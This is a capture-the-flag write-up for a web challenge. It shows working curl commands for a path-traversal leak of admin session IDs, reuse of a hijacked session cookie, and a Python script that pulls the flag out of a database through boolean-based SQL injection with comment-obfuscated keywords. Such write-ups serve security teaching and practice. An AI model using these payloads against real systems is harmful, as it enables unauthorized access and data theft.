<style> :root { color-scheme: dark; --bg: #020617; --fg: #e5e7eb; --fg-muted: #9ca3af; --accent: #38bdf8; --border-subtle: #1f2937; } /* Base page */ html, body { margin: 0; padding: 0; background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%); color: var(--fg); font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif; } /* GitHub Pages wrappers */ .page-content, .wrapper, article, .post { background: transparent !important; max-width: 960px; margin: 0 auto; padding: 2.5rem 1.5rem 4rem; } /* Headings */ .post h1, .page-content h1, article h1 { font-size: 1.6rem; margin-bottom: 0.6rem; } .post h2, .page-content h2, article h2 { font-size: 1.1rem; margin-top: 1.8rem; margin-bottom: 0.6rem; color: var(--fg-muted); } /* Tables (optional, if you use them) */ table { border-collapse: collapse; width: 100%; font-size: 0.85rem; margin: 0.4rem 0 0.8rem; border-radius: 0.6rem; overflow: hidden; } th, td { padding: 0.5rem 0.75rem; border-bottom: 1px solid var(--border-subtle); background-color: rgba(15, 23, 42, 0.9); } th { text-align: left; font-weight: 500; color: var(--fg-muted); } tbody tr:nth-child(even) td { background-color: rgba(15, 23, 42, 0.75); } tbody tr:last-child td { border-bottom: none; } /* Links */ a { color: var(--accent); } a:hover { text-decoration: none; } /* Code blocks */ pre, code, pre code, .highlight, .highlight pre, .highlight code { background-color: rgba(15, 23, 42, 0.96) !important; color: var(--fg); } pre { border: 1px solid var(--border-subtle); padding: 0.85rem 1rem; border-radius: 0.5rem; overflow-x: auto; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } code { padding: 0.1rem 0.25rem; border-radius: 0.25rem; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } </style>

# Web/Campus One - Writeup

## Summary
The site is a Next.js storefront with an admin console. A path traversal in the debug endpoint leaks active session IDs, including an admin session. Using that session cookie grants access to `/admin` and `/api/admin/search`. The search endpoint is SQL-injectable; `SELECT` is blocked by a naive filter, but comment obfuscation (`select/**/`) works. A boolean-based extraction pulls the flag from the `secrets` table.

## Recon
- Home page JS exposes a debug endpoint in `window.CAMPUS_CONFIG`:
  - `/api/v2/debug/sessions`
- Direct access returns `403`, but path traversal via `/api/admin%2f..%2fdebug%2fsessions` returns session data.

## Step 1: Leak an Admin Session
```
curl -s https://campus-one.ctf.rusec.club/api/admin%2f..%2fdebug%2fsessions
```
Look for an entry like:
```
{"sessionId":"admin_session_44920_x8z","user":"admin_root","role":"administrator"}
```

## Step 2: Access Admin Panel + API
Use the leaked session cookie:
```
SID=admin_session_44920_x8z
curl -s -H "Cookie: session_id=$SID" https://campus-one.ctf.rusec.club/admin
```

Admin UI shows a search function hitting:
```
/api/admin/search?q=...
```

## Step 3: SQL Injection via Search
The query is concatenated into a SQL `LIKE` clause. Simple `SELECT`/`UNION` payloads error (filter), but comment obfuscation works:
- `select/**/`
- `from/**/`

Boolean-based extraction works by toggling whether the query still matches results:
```
' || (CASE WHEN <cond> THEN '' ELSE 'ZZZ' END) || '
```
If `<cond>` is true, results appear; otherwise, none.

## Step 4: Extract the Flag
The flag is stored in `secrets.value`. Use binary search on length and characters:

```python
import urllib.parse, urllib.request, json

sid = "admin_session_44920_x8z"
base = "https://campus-one.ctf.rusec.club/api/admin/search?q="
opener = urllib.request.build_opener()

def check(cond):
    payload = "' || (CASE WHEN " + cond + " THEN '' ELSE 'ZZZ' END) || '"
    q = urllib.parse.quote(payload, safe="")
    req = urllib.request.Request(base + q, headers={"Cookie": f"session_id={sid}"})
    with opener.open(req, timeout=10) as resp:
        data = json.loads(resp.read().decode())
    return data.get("count", 0) > 0

# length
low, high = 1, 128
while check(f"(select/**/length(value) from/**/secrets limit 1) > {high}"):
    high *= 2
lo, hi = 1, high
while lo < hi:
    mid = (lo + hi + 1) // 2
    if check(f"(select/**/length(value) from/**/secrets limit 1) >= {mid}"):
        lo = mid
    else:
        hi = mid - 1
length = lo

# chars
flag = []
for pos in range(1, length + 1):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if check(f"(select/**/unicode(substr(value,{pos},1)) from/**/secrets limit 1) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    flag.append(chr(lo))
print("flag:", "".join(flag))
```

## Flag
`RUSEC{S3ss10n_H1j4ck1ng_1s_Fun_2938}`

